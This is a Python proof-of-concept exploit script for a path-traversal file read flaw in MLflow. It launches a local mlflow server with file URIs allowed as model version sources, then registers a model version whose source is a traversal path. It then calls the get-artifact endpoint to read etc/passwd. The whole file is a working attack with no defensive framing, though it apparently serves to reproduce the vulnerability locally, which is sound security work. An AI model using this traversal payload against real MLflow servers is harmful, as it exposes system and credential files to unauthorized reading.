import requests
import json
import subprocess
import time
import socket
import os

MLFLOW_HOST = "http://127.0.0.1:5000"
MODEL_NAME = "AModel"
LFI_PATH = "file://hostname/../../../../../../../"
TARGET_FILE = "etc/passwd"
HEADERS = {'Content-Type': 'application/json'}

def wait_for_server(host='127.0.0.1', port=5000, timeout=20):
    print("[*] Waiting for mlflow server to be ready...")
    for i in range(timeout):
        try:
            with socket.create_connection((host, port), timeout=2):
                print("[+] mlflow server is up!")
                return True
        except Exception:
            time.sleep(1)
    print("[-] Timeout waiting for mlflow server.")
    return False

def create_model():
    url = f"{MLFLOW_HOST}/api/2.0/mlflow/registered-models/create"
    data = {"name": MODEL_NAME}
    r = requests.post(url, headers=HEADERS, data=json.dumps(data))
    print(f"[+] Create model response: {r.status_code} {r.text}")

def create_model_version():
    url = f"{MLFLOW_HOST}/api/2.0/mlflow/model-versions/create"
    data = {"name": MODEL_NAME, "source": LFI_PATH}
    r = requests.post(url, headers=HEADERS, data=json.dumps(data))
    print(f"[+] Create model version response: {r.status_code} {r.text}")

def exploit_lfi(version="1"):
    url = f"{MLFLOW_HOST}/model-versions/get-artifact"
    params = {
        "path": TARGET_FILE,
        "name": MODEL_NAME,
        "version": version
    }
    r = requests.get(url, params=params)
    print(f"[+] Attempting to read {TARGET_FILE}:\n")
    print(r.text)

if __name__ == "__main__":
    print("[*] Starting mlflow server...")
    env = os.environ.copy()
    env["MLFLOW_ALLOW_FILE_URI_AS_MODEL_VERSION_SOURCE"] = "true"
    server_proc = subprocess.Popen(["mlflow", "server", "--host", "127.0.0.1"],
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE, env=env)

    if not wait_for_server():
        print("[-] Failed to start mlflow server. Exiting.")
        server_proc.terminate()
        exit(1)

    try:
        print("[*] Step 1: Creating model...")
        create_model()

        print("[*] Step 2: Creating malicious model version with LFI path...")
        create_model_version()

        print("[*] Step 3: Exploiting LFI to read server file...")
        exploit_lfi()
    finally:
        print("[*] Cleaning up...")
        server_proc.terminate()
